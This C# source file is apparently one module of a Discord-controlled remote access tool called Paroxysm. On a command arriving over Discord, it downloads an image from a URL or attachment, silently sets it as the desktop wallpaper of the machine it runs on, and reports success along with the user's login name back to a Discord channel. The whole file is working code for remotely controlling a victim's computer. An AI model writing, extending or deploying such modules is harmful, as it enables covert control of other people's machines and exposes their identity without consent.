using System.Net;
using System.Net.Mail;
using Discord;
using Paroxysm.Discord;

namespace Paroxysm.Hooks.Actions;

public static class ChangeWallpaperAction
{
    private static readonly string localImagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "temp_wallpaper.jpg");
    private static async Task<bool> SetWallpaperFromUrl(string imageUrl)
    {
        try
        {
            using WebClient client = new();
            await client.DownloadFileTaskAsync(new Uri(imageUrl), localImagePath);

            if (SetWallpaper(localImagePath))
            {
                DeleteFileAfterTime();
                return true;
            }

            DeleteFileAfterTime();
            return false;
        }
        catch
        {
            return false;
        }
    }

    private static void DeleteFileAfterTime()
    {
        Thread.Sleep(10000);
        File.Delete(localImagePath);
    }

    private static async Task<bool> SetWallpaperFromAttachment(IAttachment imageAttachment)
    {
        try
        {
            using (var httpClient = new System.Net.Http.HttpClient())
            {
                var imageData = await httpClient.GetByteArrayAsync(imageAttachment.Url);

                File.WriteAllBytes(localImagePath, imageData);

                if (SetWallpaper(localImagePath))
                {
                    DeleteFileAfterTime(); 
                    return true;
                }

                DeleteFileAfterTime();
                return false;
            }
        } catch
        {
            return false;
        }
    }

    private static bool SetWallpaper(string imagePath)
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), imagePath);
        return HookStatement.SystemParametersInfo(HookStatement.SPI_SETDESKWALL, 0, path,
            HookStatement.SPIF_UPDATE | HookStatement.SPIF_CHANGE) != 0;
    }


    public static async Task<Embed> Follow(object? image)
    {
        if (image is string)
        {
            if (await SetWallpaperFromUrl(image as string))
            {
                return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
                    "Image has been set as desktop wallpaper.", Environment.UserName, null);
            }
        } else if (image is IAttachment)
        {
            if(await SetWallpaperFromAttachment(image as IAttachment)) {
                return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.", "Image has been set as desktop wallpaper.", Environment.UserName, null);
            }
        } else
        {
            return DiscordEmbed.CreateWithText(Color.Red, "Command cannot be executed", "image data doesnt have right value", Environment.UserName, null);
        }
        return DiscordEmbed.CreateWithText(Color.Red, "There was an unexpected behavior", "While executing command something went wrong", Environment.UserName, null);
    }
}